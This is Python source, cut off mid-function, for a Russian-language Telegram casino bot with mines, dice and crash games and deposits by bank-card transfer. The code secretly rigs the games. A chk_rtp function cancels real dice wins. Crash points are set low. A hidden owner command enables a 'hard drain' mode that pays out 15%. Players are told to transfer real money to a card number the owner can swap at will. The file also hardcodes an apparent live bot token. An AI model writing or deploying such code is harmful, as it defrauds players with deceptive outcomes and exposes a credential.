import asyncio, random, sqlite3, logging, time
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery

logging.basicConfig(level=logging.INFO)
bot = Bot(token="8825080659:AAFtgFVLApTstJQW512pPHjbu3CHRS7g8EM")
dp = Dispatcher()
games = {}

db = sqlite3.connect("casino_db.db", check_same_thread=False)
cur = db.cursor()
cur.execute("CREATE TABLE IF NOT EXISTS users (user_id TEXT PRIMARY KEY, balance REAL DEFAULT 1000.0, dep_sum REAL DEFAULT 0.0, win_sum REAL DEFAULT 0.0, is_mod INTEGER DEFAULT 0)")
cur.execute("CREATE TABLE IF NOT EXISTS config (key TEXT PRIMARY KEY, value TEXT)")
cur.execute("INSERT OR IGNORE INTO config VALUES ('card', '4276 •••• •••• 1234')")
cur.execute("INSERT OR IGNORE INTO config VALUES ('rtp_mode', 'auto')")
db.commit()

L_LESENKA = {1: [1.2, 1.4, 1.5, 2.0, 2.7, 3.7], 2: [1.5, 2.3, 3.8, 6.0, 11.0, 21.0], 3: [2.2, 5.1, 12.5, 32.0, 95.0, 350.0]}

def get_u(uid):
    cur.execute("SELECT balance, is_mod FROM users WHERE user_id = ?", (str(uid),))
    r = cur.fetchone()
    if not r:
        cur.execute("INSERT INTO users (user_id) VALUES (?)", (str(uid),))
        db.commit()
        return [1000.0, 0]
    return list(r)

def chk_rtp():
    cur.execute("SELECT value FROM config WHERE key = 'rtp_mode'")
    m = cur.fetchone()
    if m and m[0] == "15": return random.randint(1, 100) <= 15
    if m and m[0] != "auto": return random.randint(1, 100) <= int(m[0])
    return random.randint(1, 100) <= 45

def get_mines_kb(g):
    kb = []
    for r in range(5):
        row = []
        for c in range(5):
            btn_text = "🟦"
            if (r, c) in g["o"]:
                btn_text = "💥" if (r, c) in g["m"] else "💎"
            row.append(InlineKeyboardButton(text=btn_text, callback_data=f"m_{g['id']}_{r}_{c}"))
        kb.append(row)
    if g["status"] == "play" and len(g["o"]) > 0:
        kb.append([InlineKeyboardButton(text="💰 Забрать выигрыш", callback_data=f"mcash_{g['id']}")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

@dp.message(Command("start"))
async def cmd_start(m: types.Message):
    get_u(m.from_user.id)
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👤 Профиль", callback_data="view_profile")],
        [InlineKeyboardButton(text="📥 Пополнить", callback_data="dep_menu"), InlineKeyboardButton(text="📤 Вывести", callback_data="wit_menu")]
    ])
    await m.answer("🎮 **Добро пожаловать в Double Cash Casino!**\n\n📌 **Доступные команды:**\n💣 /mines [мины] [ставка]\n🧗‍♂️ /lesenka [мины] [ставка]\n🎲 /cube [больше/меньше/чет/нечет] [ставка]\n🚀 /crash [ставка]", parse_mode="Markdown", reply_markup=kb)

@dp.message(Command("balance"))
async def cmd_bal(m: types.Message):
    bal, _ = get_u(m.from_user.id)
    await m.answer(f"💳 Ваш баланс: {round(bal, 2)}₽")

@dp.message(Command("admin"))
async def cmd_admin(m: types.Message):
    if str(m.from_user.id) != "8034889148": return
    cur.execute("SELECT COUNT(*), SUM(balance), SUM(dep_sum), SUM(win_sum) FROM users")
    res = cur.fetchone()
    await m.answer(f"👑 **Панель Владельца Казино**\n👤 Игроков: {res[0] or 0}\n💰 Баланс игроков: {round(res[1] or 0, 2)}₽\n\n📌 **Секретные команды админа:**\n`/выдать [ID] [сумма]` — Начислить деньги\n`/убрать [ID] [сумма]` — Списать деньги\n`/rtp-` — Включить режим жесткого слива\n`/rtp auto` — Обычный режим игры\n`/setcard [номер]` — Изменить карту приёма донатов", parse_mode="Markdown")

@dp.message(Command("setcard"))
async def cmd_setcard(m: types.Message):
    if str(m.from_user.id) != "8034889148": return
    card_num = m.text.replace("/setcard", "").strip()
    if not card_num: return await m.answer("⚠️ Введите номер карты: `/setcard 4276...`")
    cur.execute("UPDATE config SET value = ? WHERE key = 'card'", (card_num,))
    db.commit()
    await m.answer("✅ Карта для приема донатов успешно изменена!")

@dp.message(Command("rtp-"))
async def cmd_rtp_sliv(m: types.Message):
    if str(m.from_user.id) != "8034889148": return
    cur.execute("UPDATE config SET value = '15' WHERE key = 'rtp_mode'")
    db.commit()
    await m.answer("📉 **Режим жесткого слива (RTP 15%) успешно включен!**")

@dp.message(Command("rtp"))
async def cmd_rtp_auto(m: types.Message):
    if str(m.from_user.id) != "8034889148": return
    p = m.text.split()
    v = p[1] if len(p) > 1 else "auto"
    cur.execute("UPDATE config SET value = ? WHERE key = 'rtp_mode'", (v,))
    db.commit()
    await m.answer(f"⚙️ RTP переведен в режим: **{v}**")

@dp.message(Command("выдать"))
async def cmd_give(m: types.Message):
    uid = str(m.from_user.id)
    _, is_mod = get_u(uid)
    if uid != "8034889148" and is_mod != 1: return
    p = m.text.split()
    if len(p) < 3: return await m.answer("⚠️ Формат: `/выдать [ID] [сумма]`")
    t_id, amt = p[1], float(p[2])
    if t_id == uid and uid != "8034889148": return await m.answer("⚠️ Модератор не может выдавать баланс сам себе!")
    cur.execute("UPDATE users SET balance = balance + ?, dep_sum = dep_sum + ? WHERE user_id = ?", (amt, amt, t_id))
    db.commit()
    await m.answer(f"✅ Успешно выдано {amt}₽ пользователю `{t_id}`")
    try: await bot.send_message(int(t_id), f"🎁 Администратор начислил вам **{amt}₽**!")
    except: pass

@dp.message(Command("убрать"))
async def cmd_take(m: types.Message):
    if str(m.from_user.id) != "8034889148": return
    p = m.text.split()
    if len(p) < 3: return await m.answer("⚠️ Формат: `/убрать [ID] [сумма]`")
    t_id, amt = p[1], float(p[2])
    cur.execute("UPDATE users SET balance = max(0.0, balance - ?) WHERE user_id = ?", (amt, t_id))
    db.commit()
    await m.answer(f"📉 У пользователя `{t_id}` списано {amt}₽")

@dp.message(Command("mines"))
async def cmd_mines(m: types.Message):
    uid = str(m.from_user.id)
    bal, _ = get_u(uid)
    p = m.text.split()
    mc = int(p[1]) if len(p) > 1 and p[1].isdigit() else 3
    bet = float(p[2]) if len(p) > 2 else 100.0
    if mc < 2 or mc > 24: return await m.answer("⚠️ Количество мин должно быть от 2 до 24!")
    if bal < bet: return await m.answer("⚠️ Недостаточно денег на балансе!")
    cur.execute("UPDATE users SET balance = balance - ? WHERE user_id = ?", (bet, uid))
    db.commit()
    g_id = random.randint(1000, 9999)
    mines = set(random.sample([(r, c) for r in range(5) for c in range(5)], mc))
    games[uid] = {"id": g_id, "type": "mines", "m": mines, "o": set(), "bet": bet, "status": "play", "tm": mc}
    await m.answer(f"💣 **Игра «Мины» запущена!**\n💰 Ставка: {bet}₽ | Мин: {mc}", reply_markup=get_mines_kb(games[uid]))

@dp.message(Command("cube"))
async def cmd_cube(m: types.Message):
    uid = str(m.from_user.id)
    bal, _ = get_u(uid)
    p = m.text.split()
    if len(p) < 3: return await m.answer("⚠️ Формат: `/cube [больше/меньше/чет/нечет] [ставка]`")
    cmd, bet = p[1].lower(), float(p[2])
    if bal < bet: return await m.answer("⚠️ Недостаточно денег!")
    cur.execute("UPDATE users SET balance = balance - ? WHERE user_id = ?", (bet, uid))
    db.commit()
    res = await m.answer_dice(emoji="🎲")
    v = res.dice.value
    await asyncio.sleep(2.5)
    won = (v >= 4 if cmd == "больше" else v <= 3 if cmd == "меньше" else v % 2 == 0 if cmd == "чет" else v % 2 != 0)
    if won and not chk_rtp(): won = False
    if won:
        w_sum = round(bet * 1.8, 2)
        cur.execute("UPDATE users SET balance = balance + ?, win_sum = win_sum + ? WHERE user_id = ?", (w_sum, w_sum, uid))
        db.commit()
        await m.answer(f"👑 **Вы выиграли!** +{w_sum}₽ (Выпало: {v})")
    else:
        await m.answer(f"✖️ **Вы проиграли!** Выпало: {v}\n💸 -{bet}₽")

@dp.message(Command("crash"))
async def cmd_crash(m: types.Message):
    uid = str(m.from_user.id)
    bal, _ = get_u(uid)
    p = m.text.split()
    bet = float(p[1]) if len(p) > 1 else 100.0
    if bal < bet: return await m.answer("⚠️ Недостаточно денег на балансе!")
    cur.execute("UPDATE users SET balance = balance - ? WHERE user_id = ?", (bet, uid))
    db.commit()
    g_id = random.randint(1000, 9999)
    games[uid] = {"id": g_id, "type": "crash", "bet": bet, "status": "play", "mult": 1.0}
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💰 НАЖМИ ЧТОБЫ ЗАБРАТЬ", callback_data=f"c_cash_{g_id}")]])
    msg = await m.answer("🚀 **Ракета взлетает...**\n📈 Множитель: **x1.00**", reply_markup=kb)
    crash_point = round(random.uniform(1.05, 1.35) if not chk_rtp() else random.uniform(1.1, 4.5), 2)
    for _ in range(30):
        await asyncio.sleep(0.7)
        if games.get(uid) and games[uid]["status"] != "play": return
        games[uid]["mult"] += round(random.uniform(0.08, 0.22), 2)
        cur_x = round(games[uid]["mult"], 2)
        if cur_x >= crash_point:
            games[uid]["status"] = "lost"
            await msg.edit_text(f"💥 **РАКЕТА КРАШНУЛАСЬ!**\n📈 Множитель взрыва: **x{crash_point}**\n💸 Твоя ставка {bet}₽ сгорела.")
            return
        try: await msg.edit_text(f"🚀 **Ракета летит! Успей забрать!**\n📈 Текущий множитель: **x{cur_x}**", reply_markup=kb)
        except: pass

@dp.callback_query(func=lambda cb: True)
async def handle_callbacks(cb: CallbackQuery):
    uid = str(cb.from_user.id)
    if cb.data == "view_profile":
        bal, is_m = get_u(uid)
        m_status = "Владелец" if uid == "8034889148" else ("Модератор" if is_m == 1 else "Игрок")
        await cb.message.answer(f"👤 **Твой игровой профиль:**\n🆔 Твой ID: `{uid}`\n👑 Статус: {m_status}\n💳 Баланс: {round(bal, 2)}₽")
    elif cb.data == "dep_menu":
        cur.execute("SELECT value FROM config WHERE key = 'card'")
        card = cur.fetchone()[0]
        await cb.message.answer(f"💳 **Пополнение баланса (Карта):**\n\nПереведите желаемую сумму на карту:\n`{card}`\n\nПосле перевода отправьте чек в техподдержку создателю бота.")
    elif cb.data == "wit_menu":
